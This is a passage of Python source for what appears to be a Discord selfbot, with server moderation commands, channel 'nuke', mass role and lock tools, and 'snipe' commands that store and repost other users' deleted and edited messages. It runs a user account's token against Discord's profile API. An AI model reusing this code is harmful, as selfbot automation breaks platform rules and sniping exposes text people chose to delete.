        default_prompt = "(worst quality, low quality, lowres, etc.)"
        
        params = {
            "prompt": prompt,
            "n_p": default_prompt
        }
        
        response = requests.get(api_url, params=params)
        
        if response.status_code == 200:
            data = response.json()
            image_urls = data.get("result", [{}])[0].get("url", [])
            
            if image_urls:
                for url in image_urls:
                    await self.send_image(ctx,url,"image.png")
            else:
                await ctx.send("No images were generated.")
        else:
            await ctx.send("Failed to generate the image. Please try again later.")

snipe_cache = {}

class mod(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.sniped_edits = {}

    async def modify_permission(self, channel, role, **permissions):
        current_permissions = channel.overwrites_for(role)
        for key, value in permissions.items():
            setattr(current_permissions, key, value)
        await channel.set_permissions(role, overwrite=current_permissions)


    async def get_user_from_id(self, ctx, user):
        if user.startswith("<@") and user.endswith(">"):
            user_id = int(user[2:-1].replace("!", "")) 
            return ctx.guild.get_member(user_id)
        else:
            try:
                if user.isdigit():
                    return ctx.guild.get_member(int(user))
                else:
                    return discord.utils.get(ctx.guild.members, name=user.split('#')[0], discriminator=user.split('#')[1])
            except (ValueError, IndexError):
                return None

    @commands.Cog.listener()
    async def on_message_delete(self,message):
        if message.author.bot:
            return
        if message.author.id == self.bot.user.id:
            return
        if message.channel.id not in snipe_cache:
            snipe_cache[message.channel.id] = []
        snipe_cache[message.channel.id].append({
            "author": message.author,
            "content": message.content,
            "time": message.created_at
        })
        if len(snipe_cache[message.channel.id]) > 5:
            snipe_cache[message.channel.id].pop(0)

    async def send_webhook_message(self, ctx, title, description):
        try:
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
            color = int(config.get("embed_colour").lstrip("#"), 16)
            webhook = await ctx.channel.create_webhook(name=title) 
            embed = discord.Embed(
                title=f"{description}",
                color=discord.Color(color)
            )
            avatar = ctx.author.avatar.url or "https://i.postimg.cc/PqnFB2PX/20250312-144720.png"
            await webhook.send(embed=embed, username=title, avatar_url=avatar)
            await webhook.delete()
        except:
            await send(ctx,title,description)

    @commands.command(aliases=["guilname","guildrename"])
    async def gname(self, ctx, *, name: str):
        await ctx.message.delete()
        if ctx.guild:
            await ctx.guild.edit(name=name)
            await ctx.send(f"<:arrow:1554766539042062446> **Server name changed to {name}**")

    @commands.command()
    async def makech(self, ctx, name: str, category_id: int = None):
        guild = ctx.guild
        if guild:
            category = discord.utils.get(guild.categories, id=category_id) if category_id else None
            new_channel = await guild.create_text_channel(name, category=category)
            await ctx.send(f"<:arrow:1554766539042062446> **Created channel: {new_channel.mention}**")

    @commands.command()
    async def makecat(self, ctx, *, name: str):
        guild = ctx.guild
        if guild:
            new_category = await guild.create_category(name)
            await ctx.send(f"<:arrow:1554766539042062446> **Created category: {new_category.name}**")

    @commands.command()
    async def makerole(self,ctx, *, name: str,hex_color: str = None):
        await ctx.message.delete()
        guild = ctx.guild
        if guild:
            if hex_color:
                try:
                    color = int(hex_color.lstrip("#"), 16)
                except ValueError:
                    await ctx.send("Invalid color format. Use hex format (e.g., #FF5733).")
                    return
            else:
                color = discord.Color.default()
            new_role = await guild.create_role(name=name, color=color)
            await ctx.send(f"<:arrow:1554766539042062446> **Created role: {new_role.name}**")

    @commands.command()
    async def delcat(self,ctx,category_id):
        await ctx.message.delete()
        guild = ctx.guild
        if guild:
            category = discord.utils.get(guild.categories, id=category_id)
            if category:
                await category.delete()
                await ctx.send(f"<:arrow:1554766539042062446> **Deleted category: {category.name}**")
            else:
                await ctx.send("Category not found.")        

    @commands.command()
    async def delrole(self,ctx,role:discord.Role):
        await ctx.message.delete()
        guild = ctx.guild
        if guild:
            role = discord.utils.get(guild.roles, id=role.id)
            if role:
                await role.delete()
                await ctx.send(f"<:arrow:1554766539042062446> **Deleted role: {role.name}**")
            else:
                await ctx.send("Role not found.")

    @commands.command(aliases=['moderetion', 'mod', 'moderation'])
    async def mods(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"            
            f"<a:staff:1554757404972032060> | **Purge messages** **:** **`{prefix}purge [count]`**\n"
            f"<a:staff:1554757404972032060> | **Snipe message** **:** **`{prefix}snipe`**\n"
            f"<a:staff:1554757404972032060> | **Snipe all messages** **:** **`{prefix}snipeall`**\n"            
            f"<a:staff:1554757404972032060> | **Edit snipe message** **:** **`{prefix}esnipe`**\n"
            f"<a:staff:1554757404972032060> | **Edit Snipe all messages** **:** **`{prefix}esnipeall`**\n"                 
            f"<a:staff:1554757404972032060> | **Bot latency** **:** **`{prefix}ping`**\n"
            f"<a:staff:1554757404972032060> | **Kick a user** **:** **`{prefix}kick [user]`**\n"
            f"<a:staff:1554757404972032060> | **Ban a user** **:** **`{prefix}ban [user]`**\n"
            f"<a:staff:1554757404972032060> | **Unban a user** **:** **`{prefix}unban [user]`**\n"
            f"<a:staff:1554757404972032060> | **Mute a user** **:** **`{prefix}mute [user] [minutes]`**\n"
            f"<a:staff:1554757404972032060> | **Unmute a user** **:** **`{prefix}unmute [user]`**\n"
            f"<a:staff:1554757404972032060> | **Hide the channel** **:** **`{prefix}hide`**\n"
            f"<a:staff:1554757404972032060> | **Create channel** **:** **`{prefix}makech [name] <cat ID>`**\n"
            f"<a:staff:1554757404972032060> | **Create category** **:** **`{prefix}makecat [name]`**\n"
            f"<a:staff:1554757404972032060> | **Create role** **:** **`{prefix}makerole [name] <hex color>`**\n"
            f"<a:staff:1554757404972032060> | **Delete current channel** **:** **`{prefix}delete`**\n"
            f"<a:staff:1554757404972032060> | **Change guild name** **:** **`{prefix}gname [name]`**\n"                  
            f"<a:staff:1554757404972032060> | **Unhide the channel** **:** **`{prefix}unhide`**\n"
            f"<a:staff:1554757404972032060> | **Hide all channels** **:** **`{prefix}hideall`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )        
        await send(ctx, "<:rocket1:1554756297143095346>__Moderation Commands Page 1__<a:crown:1554756538445336626>", description)

        description2 = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"            
            f"<a:staff:1554757404972032060> | **Unhide all channels** **:** **`{prefix}unhideall`**\n"
            f"<a:staff:1554757404972032060> | **Lock the channel** **:** **`{prefix}lock`**\n"
            f"<a:staff:1554757404972032060> | **Unlock the channel** **:** **`{prefix}unlock`**\n"
            f"<a:staff:1554757404972032060> | **Lock all channels** **:** **`{prefix}lockall`**\n"
            f"<a:staff:1554757404972032060> | **Unlock all channels** **:** **`{prefix}unlockall`**\n"
            f"<a:staff:1554757404972032060> | **Add/remove a role** **:** **`{prefix}role [user] [role]`**\n"
            f"<a:staff:1554757404972032060> | **Role all members** **:** **`{prefix}roleall [role]`**\n"
            f"<a:staff:1554757404972032060> | **Role all bots** **:** **`{prefix}rolebots [role]`**\n"
            f"<a:staff:1554757404972032060> | **Role all humans** **:** **`{prefix}rolehuman [role]`**\n"
            f"<a:staff:1554757404972032060> | **Autorole** **:** **`{prefix}autorole [add/rem] [role]`**\n"
            f"<a:staff:1554757404972032060> | **Autorole clear** **:** **`{prefix}aroleclear`**\n"
            f"<a:staff:1554757404972032060> | **Change nick** **:** **`{prefix}nick [user] [new name]`**\n"
            f"<a:staff:1554757404972032060> | **Nuke channel** **:** **`{prefix}nuke`**\n"
            f"<a:staff:1554757404972032060> | **Create a webhook** **:** **`{prefix}createwebhook [name]`**\n"
            f"<a:staff:1554757404972032060> | **Get userinfo** **:** **`{prefix}userinfo <user>`**\n"
            f"<a:staff:1554757404972032060> | **Get serverinfo** **:** **`{prefix}serverinfo`**\n"
            f"<a:staff:1554757404972032060> | **Display member count** **:** **`{prefix}members`**\n"
            f"<a:staff:1554757404972032060> | **Display boost count** **:** **`{prefix}boosts`**\n"
            f"<a:staff:1554757404972032060> | **Send a webhook message** **:** **`{prefix}websend [webhook_url]`**\n"
            f"<a:staff:1554757404972032060> | **Get role info** **:** **`{prefix}roleinfo [role ID]`**\n"
            f"<a:staff:1554757404972032060> | **Get user avatar** **:** **`{prefix}avatar [user]`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Moderation Commands Page 2__<a:crown:1554756538445336626>", description2)        

    @commands.command(aliases=['arole'])
    async def autorole(self, ctx, action: str, role: discord.Role):
        await ctx.message.delete()
        action = action.lower()
        if action not in ["add", "remove", "rem"]:
            await send(ctx, "Autorole", f"<:arrow:1554766539042062446> **Invalid action**\nUse `add` to add an autorole or `remove` to remove it.\nExample: `{ctx.prefix}autorole add @role`")
            return
        guild_id = str(ctx.guild.id)
        with open('database/autoroles.json', 'r') as f:
            data = json.load(f)
        if guild_id not in data:
            data[guild_id] = {
                "roles": [],
                "channel_id": None  
            }
        if action == "add":
            if role.id not in data[guild_id]["roles"]:
                data[guild_id]["roles"].append(role.id)
                with open('database/autoroles.json', 'w') as f:
                    json.dump(data, f, indent=4)
                await send(ctx, "Autorole", f"**Autorole task added**\n**Role:** {role.mention}\nRole `@{role.name}` will be assigned to new members.")
        elif action in ["remove", "rem"]:
            if role.id in data[guild_id]["roles"]:
                data[guild_id]["roles"].remove(role.id)
                with open('database/autoroles.json', 'w') as f:
                    json.dump(data, f, indent=4)
                await send(ctx, "Autorole", f"**Autorole task removed**\n**Role:** {role.mention}\nRole `@{role.name}` will no longer be assigned to new members.")

    @commands.command(aliases=['aroleclear','arolewipe','clearautorole'])
    async def autoroleclear(self,ctx):
        await ctx.message.delete()
        with open('database/autoroles.json', 'r') as f:
            data = json.load(f)
        guild_id = str(ctx.guild.id)
        if guild_id in data:
            del data[guild_id]
            with open('database/autoroles.json', 'w') as f:
                json.dump(data, f)
            await send(ctx,"Autorole",f"**Autorole task cleared**\n**Guild ID:** {guild_id}\nAll autoroles have been removed.")
        else:
            await send(ctx,"Autorole",f"**Autorole task not found**\n**Guild ID:** {guild_id}\nNo autoroles were found for this server.")

    @commands.command(aliases=['arolelog','arolelogschannel'])
    async def arolelogs(self,ctx,channel:discord.TextChannel):
        await ctx.message.delete()
        with open('database/autoroles.json', 'r') as f:
            data = json.load(f)
        guild_id = str(ctx.guild.id)
        if guild_id not in data:
            data[guild_id] = {
                "roles": [],
                "channel_id": channel.id  
            }
        else:
            data[guild_id]["channel_id"] = channel.id
        with open('database/autoroles.json', 'w') as f:
            json.dump(data, f, indent=4)
        await send(ctx,"Autorole",f"**Autorole logs channel set**\n**Channel:** {channel.mention}\nAll autorole assignments will be logged in this channel.")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        
        try:
            with open('database/autoroles.json', 'r') as f:
                data = json.load(f)
        except FileNotFoundError:
            return  

        guild_id = str(member.guild.id)
        if guild_id not in data:
            return

        role_ids = data[guild_id].get("roles", [])
        channel_id = data[guild_id].get("channel_id")
        channel = member.guild.get_channel(channel_id) if channel_id else None

        assigned_roles = []

        for role_id in role_ids:
            role = member.guild.get_role(role_id)
            if role:
                try:
                    await member.add_roles(role)
                    assigned_roles.append(role)
                except discord.Forbidden:
                    print(f"Missing permissions to assign role: {role.name}")
                    continue

        if assigned_roles and channel:
            try:
                webhook = await channel.create_webhook(name="Autorole Logs")
                roles_mentions = ", ".join([f"{r.mention}" for r in assigned_roles])
                with open('config.json', 'r') as config_file:
                    config = json.load(config_file)
                color = int(config.get("embed_colour").lstrip("#"), 16)
                embed = discord.Embed(
                    title="✅ Autorole Assigned",
                    description=f"**User:** {member.mention} (`{member}`)\n**Roles:** {roles_mentions}",
                    color=discord.Color(color)
                )

                avatar_url = member.avatar.url if member.avatar else "https://i.postimg.cc/PqnFB2PX/20250312-144720.png"
                embed.set_thumbnail(url=avatar_url)

                await webhook.send(embed=embed, username="Autorole Logs", avatar_url=avatar_url)
                await webhook.delete()
            except discord.HTTPException as e:
                await webhook.send(e)

    @commands.command(name='snipe')
    async def snipe(self, ctx):
        sniped_messages = snipe_cache.get(ctx.channel.id, [])
        if sniped_messages:
            sniped_message = sniped_messages[-1]
            await self.send_snipe_embed(ctx, sniped_message)
            await ctx.message.delete()            
        else:
            await ctx.message.delete()
            await send(ctx, "No Message to snipe", "No recently deleted messages found in this channel.")

    @commands.command(name='snipeall')
    async def snipeall(self, ctx):
        sniped_messages = snipe_cache.get(ctx.channel.id, [])
        if sniped_messages:
            await ctx.message.delete()
            for sniped_message in sniped_messages[-10:]:
                await self.send_snipe_embed(ctx, sniped_message)
        else:
            await ctx.message.delete()
            await send(ctx, "Message Snipe", "No recently deleted messages found in this channel.")

    async def send_snipe_embed(self, ctx, sniped_message):
        ist = pytz.timezone(time_zone)
        author = sniped_message["author"]
        content = sniped_message["content"]
        utc_time = sniped_message["time"].replace(tzinfo=timezone.utc)
        ist_time = utc_time.astimezone(ist).strftime("%I:%M:%S %p")
        unavailable = "*Message unavailable*"
        description = f"**<:arrow:1554766539042062446> Time :** **`{ist_time}`**\n"
        description += f"**<:arrow:1554766539042062446> Content :** {content or unavailable}\n"
        await send(ctx, f"{author} deleted a message", description)

    @commands.Cog.listener()
    async def on_message_edit(self, before: discord.Message, after: discord.Message):
        if before.author.bot or before.content == after.content:
            return
        before_content = before.content.replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        after_content = after.content.replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        if before.channel.id not in self.sniped_edits:
            self.sniped_edits[before.channel.id] = []
        self.sniped_edits[before.channel.id].append({
            "author": before.author,
            "before": before_content or "*No content*",
            "after": after_content or "*No content*"
        })

    @commands.command(name="esnipe")
    async def esnipe(self, ctx):
        await ctx.message.delete()
        
        if ctx.channel.id in self.sniped_edits and self.sniped_edits[ctx.channel.id]:
            sniped_message = self.sniped_edits[ctx.channel.id].pop()
            await self.send_esnipe_embed(ctx, sniped_message)
        else:
            await send(ctx, "Message Edit Snipe", "No edited messages found in this channel.")

    @commands.command(name="esnipeall")
    async def esnipeall(self, ctx):
        await ctx.message.delete()
        if ctx.channel.id in self.sniped_edits and self.sniped_edits[ctx.channel.id]:
            for sniped_message in self.sniped_edits[ctx.channel.id][-10:]:
                await self.send_esnipe_embed(ctx, sniped_message)
        else:
            await send(ctx, "Message Edit Snipe", "No edited messages found in this channel.")
    async def send_esnipe_embed(self, ctx, sniped_message):
        author = sniped_message["author"]
        before = sniped_message["before"]
        after = sniped_message["after"]
        description = (
            f"**<:arrow:1554766539042062446> User:** {author.mention} (`{author}`)\n"
            f"**<:arrow:1554766539042062446> Before :** {before}\n"
            f"**<:arrow:1554766539042062446> After :** {after}"
        )
        await send(ctx, "Message Edit Snipe", description)

    @commands.command(aliases=['clear'])
    async def purge(self, ctx, count: int):
        await ctx.message.delete()
        
        if isinstance(ctx.channel, (discord.DMChannel, discord.GroupChannel)):
            deleted_count = await self.delete_own_messages(ctx.channel, count)
            await ctx.send(f"**Purged `{deleted_count}` messages.**", delete_after=5)
            return
        
        if ctx.author.guild_permissions.manage_messages:
            deleted = await ctx.channel.purge(limit=count)
            await ctx.send(f"**Purged `{len(deleted)}` messages.**", delete_after=5)
        else:
            def is_own_message(message):
                return message.author == ctx.author
            deleted = await ctx.channel.purge(limit=count, check=is_own_message)
            await ctx.send(f"**Purged `{len(deleted)}` messages.**", delete_after=5)

    async def delete_own_messages(self, channel, target_count):
        delete_count = target_count
        deleted_count = 0
        async for message in channel.history(limit=100): 
            if message.author == self.bot.user:
                await message.delete()
                deleted_count += 1
                delete_count -= 1 
                if delete_count <= 0:
                    break
            else:
                delete_count -= 1 
        return deleted_count
    
    @commands.command()
    async def ping(self,ctx):
        await ctx.message.delete()
        latency = round(self.bot.latency * 1000)
        await send(ctx,"Bot ping",f"<:arrow:1554766539042062446> Pong : {latency} ms")

    @commands.command()
    async def nick(self, ctx, member: discord.Member, *, nickname=None):
        await ctx.message.delete()
        await member.edit(nick=nickname)
        await self.send_webhook_message(ctx, "Nickname Change", f"**`{member.display_name}`**'s nickname has been changed to **`{nickname or 'reset'}`**.")

    @commands.command()
    async def kick(self, ctx, member: discord.Member, *, reason="No reason provided"):
        await ctx.message.delete()
        await member.kick(reason=reason)
        await self.send_webhook_message(ctx, "Kick", f"User **`{member.display_name}`** has been kicked.\nReason: **`{reason}`**")

    @commands.command()
    async def ban(self, ctx, member: discord.Member, *, reason="No reason provided"):
        await ctx.message.delete()
        await ctx.guild.ban(member, reason=reason)
        await self.send_webhook_message(ctx, "Ban", f"User **`{member.display_name}`** has been banned.\nReason: **`{reason}`**")

    @commands.command()
    async def unban(self, ctx, user: str):
        await ctx.message.delete()
        banned_users = await ctx.guild.bans()
        if user.isdigit():
            user = await self.bot.fetch_user(int(user))
        else:
            user_name, user_discriminator = user.split('#')
            user = discord.utils.get(banned_users, user__name=user_name, user__discriminator=user_discriminator)

        if user:
            await ctx.guild.unban(user.user if isinstance(user, discord.guild.BanEntry) else user)
            await self.send_webhook_message(ctx, "Unban", f"User **`{user.display_name}`** has been unbanned.")
        else:
            await senderror(ctx, "Error", "User not found.")

    @commands.command()
    async def mute(self, ctx, member: discord.Member, minutes: int, *, reason="No reason provided"):
        await ctx.message.delete()
        await member.timeout(timedelta(minutes=minutes), reason=reason)
        await self.send_webhook_message(ctx, "Mute", f"User **`{member.display_name}`** has been muted for **`{minutes}`** minutes.\nReason: **`{reason}`**")


    @commands.command()
    async def unmute(self, ctx, member: discord.Member):
        await ctx.message.delete()
        await member.timeout(None)
        await self.send_webhook_message(ctx, "Unmute", f"User **`{member.display_name}`** has been unmuted.")

    @commands.command()
    async def role(self, ctx, member: discord.Member, role: discord.Role):
        await ctx.message.delete()
        if role in member.roles:
            await member.remove_roles(role)
            await self.send_webhook_message(ctx, "Role Removed", f"The **`{role.name}`** role has been removed from **`{member.display_name}`**.")
        else:
            await member.add_roles(role)
            await self.send_webhook_message(ctx, "Role Added", f"The **`{role.name}`**role has been added to **`{member.display_name}`**.")

    @commands.command()
    async def lock(self, ctx):
        await ctx.message.delete()
        await self.modify_permission(ctx.channel, ctx.guild.default_role, send_messages=False)
        await self.send_webhook_message(ctx, "Lock Channel", f"Channel {ctx.channel.mention} is now locked.")

    @commands.command()
    async def unlock(self, ctx):
        await ctx.message.delete()
        await self.modify_permission(ctx.channel, ctx.guild.default_role, send_messages=True)
        await self.send_webhook_message(ctx, "Unlock Channel", f"Channel {ctx.channel.mention} is now unlocked.")

    @commands.command()
    async def hide(self, ctx):
        await ctx.message.delete()
        await self.modify_permission(ctx.channel, ctx.guild.default_role, view_channel=False)
        await self.send_webhook_message(ctx, "Hide Channel", f"Channel {ctx.channel.mention} is now hidden from everyone.")

    @commands.command()
    async def unhide(self, ctx):
        await ctx.message.delete()
        await self.modify_permission(ctx.channel, ctx.guild.default_role, view_channel=True)
        await self.send_webhook_message(ctx, "Unhide Channel", f"Channel {ctx.channel.mention} is now visible to everyone.")

    @commands.command()
    async def lockall(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await self.modify_permission(channel, ctx.guild.default_role, send_messages=False)
                except Exception as e:
                    await ctx.send(f"Failed to lock channel {channel.name}: {e}")
        
    @commands.command()
    async def unlockall(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await self.modify_permission(channel, ctx.guild.default_role, send_messages=True)
                except Exception as e:
                    await ctx.send(f"Failed to unlock channel {channel.name}: {e}")

    @commands.command()
    async def hideall(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await self.modify_permission(channel, ctx.guild.default_role, view_channel=False)
                except Exception as e:
                    await ctx.send(f"Failed to hide channel {channel.name}: {e}")
        
    @commands.command()
    async def unhideall(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await self.modify_permission(channel, ctx.guild.default_role, view_channel=True)
                except Exception as e:
                    await ctx.send(f"Failed to unhide channel {channel.name}: {e}")

    @commands.command()
    async def roleall(self, ctx, role: discord.Role):
        await ctx.message.delete()
        for member in ctx.guild.members:
            await member.add_roles(role)
        await self.send_webhook_message(ctx, "Role Added to All", f"The **`{role.name}`** role has been added to all members.")

    @commands.command()
    async def rolebots(self, ctx, role: discord.Role):
        await ctx.message.delete()
        for member in ctx.guild.members:
            if member.bot:
                await member.add_roles(role)
        await self.send_webhook_message(ctx, "Role Added to Bots", f"The **`{role.name}`** role has been added to all bots.")

    @commands.command()
    async def rolehuman(self, ctx, role: discord.Role):
        for member in ctx.guild.members:
            if not member.bot:
                await member.add_roles(role)
        await self.send_webhook_message(ctx, "Role Added to Humans", f"The **`{role.name}`** role has been added to all human members.")

    @commands.command()
    async def rename(self, ctx, *, new_name: str):
        await ctx.message.delete()
        try:
            old_name = ctx.channel.name
            await ctx.channel.edit(name=new_name)
            await self.send_webhook_message(ctx, "Channel Renamed", f"The channel has been renamed from **`{old_name}`** to **`{new_name}`**.")
        except Exception as e:
            await senderror(ctx, "Error", f"Could not rename the channel: {str(e)}")

    @commands.command()
    async def nuke(self, ctx):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        color = int(config.get("embed_colour").lstrip("#"), 16)
        await ctx.message.delete()
        position = ctx.channel.position
        new_channel = await ctx.channel.clone()
        await ctx.channel.delete()
        await new_channel.edit(position=position)
        webhook = await new_channel.create_webhook(name="Nuked")
        embed = discord.Embed(
            title="Nuked",
            description=f"This channel has been nuked by {ctx.author.mention}",
            color=discord.Color(color)
        )
        avatar = ctx.author.avatar.url or "https://cdn.discordapp.com/attachments/1302633643167977573/1330486487728521267/WhatsApp_Image_2025-01-19_at_16.06.14_7efa39d5_cleanup.jpg?ex=678e2799&is=678cd619&hm=de66aaf46c6474ae9c8044e12ac20be38db1e93f915dcaa8ae706d4ae2716696&"
        await webhook.send(ctx.author.mention,embed=embed,avatar_url=avatar)
        await webhook.delete()

    @commands.command()
    async def clone(self, ctx):
        await ctx.message.delete()
        new_channel = await ctx.channel.clone()
        await ctx.send(f"<:arrow:1554766539042062446> **Channel cloned:** {new_channel.mention}")

    @commands.command(aliases=['crw'])
    async def createwebhook(self, ctx,*, webhook_name = None):
        await ctx.message.delete()
        name = webhook_name or f"{selfbot_name}"
        webhook = await ctx.channel.create_webhook(name=name)
        await self.send_webhook_message(ctx, "Webhook Created", f"Webhook created: {webhook.url}")

    @commands.command(aliases=['del'])
    async def delete(self, ctx):
        await ctx.message.delete()
        await ctx.send("<:arrow:1554766539042062446> **Deleting this channel in 5 seconds.**",delete_after=4)
        await asyncio.sleep(5)
        await ctx.channel.delete()

    @commands.command(aliases=['ava'])
    async def avatar(self, ctx, user: discord.User = None):
        await ctx.message.delete()
        user = user or ctx.author
        avatar_url = user.avatar.url
        await send(ctx,".",f"[`{user.name}'s Avatar`]({avatar_url})\n",image=avatar_url,footer=".")

    @commands.command()
    async def banner(self, ctx, user: discord.User = None):
        await ctx.message.delete()
        user = user or ctx.author
        user_id = user.id if user else ctx.author.id
        url = f"https://discord.com/api/v9/users/{user_id}/profile"
        headers = {"Authorization": self.bot.http.token}
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as response:
                if response.status != 200:
                    await ctx.send("Failed to fetch user info.\nInvalid user ID or You are not in any mutual server with the user")
                    return
                data = await response.json()        
        banner_id = data.get("user_profile", {}).get("banner")        
        if banner_id:
            ext = "gif" if banner_id.startswith("a_") else "png"
            banner_url = f"[`{user.name}'s Banner`](https://cdn.discordapp.com/banners/{user_id}/{banner_id}.{ext}?size=512)"
            url = f"https://cdn.discordapp.com/banners/{user_id}/{banner_id}.{ext}?size=512"
        else:
            banner_url = "Banner not found"
        await send(ctx,".",banner_url,image=None if banner_url == "Banner not found" else url,footer=".")

    @commands.command()
    async def roleinfo(self, ctx, role:discord.Role):
        await ctx.message.delete()
        role_info = (
            f"<:arrow:1554766539042062446> **Role Name:** `{role.name}`\n"
            f"<:arrow:1554766539042062446> **Role ID:** `{role.id}`\n"
            f"<:arrow:1554766539042062446> **Role Color:** `{role.color}`\n"
            f"<:arrow:1554766539042062446> **Role Members:** `{len(role.members)}`\n"
            f"<:arrow:1554766539042062446> **Role Position:** `{role.position}`\n"
            f"<:arrow:1554766539042062446> **Role Created At:** `{role.created_at.strftime('%Y-%m-%d')}`\n"
            f"<:arrow:1554766539042062446> **Role Mentionable:** `{'Yes' if role.mentionable else 'No'}`\n"
            f"<:arrow:1554766539042062446> **Role Hoisted:** `{'Yes' if role.hoist else 'No'}`\n"
            f"<:arrow:1554766539042062446> **Role Permissions:** `{role.permissions.value}`"
        )
        await send(ctx, "Role Info", role_info)   

    @commands.command(aliases=['ui', 'whois', 'about'])
    async def userinfo(self, ctx, user : discord.User = None):
        user = user or ctx.author
        await ctx.message.delete()
        user_id = user.id if user else ctx.author.id
        url = f"https://discord.com/api/v9/users/{user_id}/profile"
        headers = {"Authorization": self.bot.http.token}
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as response:
                if response.status != 200:
                    await ctx.send("Failed to fetch user info.\nInvalid user ID or You are not in any mutual server with the user")
                    return
                data = await response.json()
        user_obj = data.get("user", {})
        avatar_url = f"[`{user.name}'s Avatar`](<{user.avatar.url}>)" if user.avatar else "Not found"
        banner_id = data.get("user_profile", {}).get("banner")
        if banner_id:
            ext = "gif" if banner_id.startswith("a_") else "png"
            banner_url = f"[`{user.name}'s Banner`](<https://cdn.discordapp.com/banners/{user_id}/{banner_id}.{ext}?size=4096>)"
            url = f"https://cdn.discordapp.com/banners/{user_id}/{banner_id}.{ext}?size=512"
        else:
            banner_url = "Not found"
        account_created_at = datetime.fromtimestamp(((int(user_id) >> 22)  + 1420070400000) / 1000, tz=pytz.utc)
        now_utc = datetime.now(pytz.utc)
        account_age = (now_utc - account_created_at.replace(tzinfo=pytz.utc)).days
        bio = data.get("user_profile", {}).get("bio", "No bio").replace("\n", "\n")
        member = None
        for guild in self.bot.guilds:
            member = guild.get_member(int(user_id))
            if member:
                break
        presence = str(member.status).capitalize() if member else "Unknown"
        user_info = (
            f"<:arrow:1554766539042062446> **Username :** `{user.name}`\n"
            f"<:arrow:1554766539042062446> **Mention :** {user.mention}\n"
            f"<:arrow:1554766539042062446> **Global name :** `{user.global_name}`\n"
            f"<:arrow:1554766539042062446> **User ID :** `{user_id}`\n"
            f"<:arrow:1554766539042062446> **Account Age :** `{account_age}` days\n"
            f"<:arrow:1554766539042062446> **Bot :** `{'Yes' if user_obj.get('bot', False) else 'No'}`\n"
            f"<:arrow:1554766539042062446> **Presence :** `{presence}`\n"
            f"<:arrow:1554766539042062446> **Avatar :** {avatar_url}\n"
            f"<:arrow:1554766539042062446> **Banner :** {banner_url}\n"
            f"<:arrow:1554766539042062446> **Bio :**\n{bio}"
        )

        await send(ctx, "User Info", user_info,image=None if banner_url == "Not found" else url,thumbnail=None if avatar_url=="Not found" else user.avatar.url,footer = ".")


    @commands.command(aliases=['si'])
    async def serverinfo(self,ctx):
        await ctx.message.delete()    
        guild = ctx.guild
        owner = guild.owner
        server_name = guild.name
        server_id = guild.id
        member_count = guild.member_count
        created_at = guild.created_at.strftime("%Y-%m-%d")
        roles = len(guild.roles)
        channels = len(guild.channels)

        message = (
            f"<:arrow:1554766539042062446> **Server Name:** `{server_name}`\n"
            f"<:arrow:1554766539042062446> **Server ID:** `{server_id}`\n"
            f"<:arrow:1554766539042062446> **Member Count:** `{member_count}`\n"
            f"<:arrow:1554766539042062446> **Server Owner:** `{owner}`\n"
            f"<:arrow:1554766539042062446> **Created At:** `{created_at}`\n"
            f"<:arrow:1554766539042062446> **Number of Roles:** `{roles}`\n"
